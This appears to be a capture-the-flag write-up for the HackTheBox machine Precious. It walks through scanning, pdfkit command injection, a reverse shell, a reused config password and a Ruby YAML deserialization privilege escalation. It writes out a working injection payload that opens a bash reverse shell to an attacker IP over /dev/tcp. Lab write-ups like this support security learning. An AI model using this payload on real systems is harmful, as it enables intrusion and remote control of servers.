# Precious.HTB-Write-Up
Write up report for the HackTheBox machine Precious.

- Initiated a service/network scan on the given HTB box with Nmap. `nmap -sV -sC 10.129.230.167`

![image](https://user-images.githubusercontent.com/61332852/226735722-c099909e-f7c7-4d18-a68b-b9c45b85dc47.png)


- Nmap shows that a HTTP (80) Port was open and an SSH(22) port as well. I first checked to see if there was any exploits pertaining to the services of the HTTP server that was hosting the website and as well as the SSH service running. I used the command `searchsploit` and as well searched online to double check that the results searchsploit was returning was accurate.  

![image](https://user-images.githubusercontent.com/61332852/226736215-366962c6-ee2b-488f-ad4f-17bad695c042.png)


- After seeing there was no obvious exploits to take advantage of the next step was browsing the website running. First, I added the IP to /etc/hosts file. ` sudo nano /etc/hosts`

![image](https://user-images.githubusercontent.com/61332852/226736557-b8b2f55a-1e43-489f-b733-8f6becb15b64.png)


- The website consisted of an input box that took a URL as input and the website would output that URL as a PDF File. I began running `gobuster` to see if there was anything other than what was given on the home page but returned no results of any other directories on the web server.  

![image](https://user-images.githubusercontent.com/61332852/226736779-32a51f2f-76c9-4960-99e5-877228e9d73f.png)


- After messing with the input box, I opened `BurpSuite` to see what the application was doing when inputting a URL. After inputting a couple different random websites, the application was returning nothing but a `Cannot load remote URL` message. Thus, I began to start my own python webserver on my localhost. `python3 -m http.server 80` 

![image](https://user-images.githubusercontent.com/61332852/226736963-a16717a2-5bdc-4716-a69f-361849b8c829.png)


- After inputting the local python server that I had started it returned the contents within the file directory of my local http server. 

![image](https://user-images.githubusercontent.com/61332852/226737299-dd46b238-ef1d-4cd2-a25f-ba8cbc6e237b.png)


- I used `exiftool` to see if there was any information I can get out of behind the PDF file that was downloaded from the website. Which gave us the software that was converting the URL to PDF. 

![image](https://user-images.githubusercontent.com/61332852/226737327-55719231-e332-4057-8b30-2438a105f5f8.png)


- I used the `searchsploit` command again here to see if there was anything it would find for `pdfkit v0.8.6` which was the software that running. It returned nothing as well so I went to google search to see if there were any vulnerabilities with the software running. I then found that it was vulnerable to `command injection` a type of injection vulnerability.    

![image](https://user-images.githubusercontent.com/61332852/226737890-c371feca-31f6-4dda-9365-8cabb7999d1d.png)

![image](https://user-images.githubusercontent.com/61332852/226737908-9bbada7a-a4df-4f9e-bebc-a1d53eb8fe54.png)


- Reading more of the vulnerability and what we can start to do to exploit it this is what I found. `An application could be vulnerable if it tries to render a URL that contains query string parameters with user input`. After using this information, we can modify the URL to take a command as input to see if the application will run the command.  

![image](https://user-images.githubusercontent.com/61332852/226738055-735cb83d-6477-47b7-a278-13d4438e5304.png)


- After grabbing a reverse shell command, I inserted it as a string within the URL ``http://10.10.14.66:8910/?name=#{'%20`bash -c 'exec bash -I &>/dev/tcp/10.10.14.66/4444 <&1'`'}``. Thus, getting me in as the user `Ruby` within the webserver.  

![image](https://user-images.githubusercontent.com/61332852/226738285-5386a5c2-383d-4aa4-be2f-d65efa8fff0f.png)


- Going through all the files and directories that were given I first went to the users home folder to see if the user flag was there but didn’t consist of anything at first. I then used `ls -la`. I found something I don’t see usually which was a directory called `.bundle` which I then found a config file consisting of another user’s (`henry`) password.  

![image](https://user-images.githubusercontent.com/61332852/226738514-917ee43c-6457-4b3d-8c60-f577cb0495fd.png)


- I began to login as the user `henry` with the given password. Successfully getting us in. I first checked Henrys home directory to check for any flags shown there. Then giving us our first flag.  

![image](https://user-images.githubusercontent.com/61332852/226738766-11e85f49-fef7-4ebb-8e15-eb332391227a.png)


- To start privilege escalation towards getting the root flag I first checked what permissions Henry had as root on the machine.  

![image](https://user-images.githubusercontent.com/61332852/226738844-bf533d21-12e3-4c40-898b-b632a743f524.png)


- After checking the file, I then researched if there were any vulnerabilities with the Yaml file that was given. Then later finding that the Yaml file was vulnerable to a `Yaml Deserialization Attack` allowing us to run arbitrary code within the yaml file. We can now go look for an exploit to run in the dependency file to execute. After looking for the Ruby Yaml Exploit code we found the code to run from a GitHub Host. We then created a file within our home folder `touch dependency.yml` to paste the following code into. 

![image](https://user-images.githubusercontent.com/61332852/226739595-742932f9-aa3f-4904-a482-8e5c341fbb56.png)


- After running `sudo /usr/bin/ruby /opt/update_dependencies.rb` we can now run `/bin/bash -p` to see if we spawn as the root user. Which is successful.

![image](https://user-images.githubusercontent.com/61332852/226739923-93992744-9357-4dfd-b1ab-93a74e4fc6d9.png)


- After going into roots home folder we find the root flag for the machine.

![image](https://user-images.githubusercontent.com/61332852/226740263-29e5447a-2cfb-4340-89f5-185a30987b89.png)
 
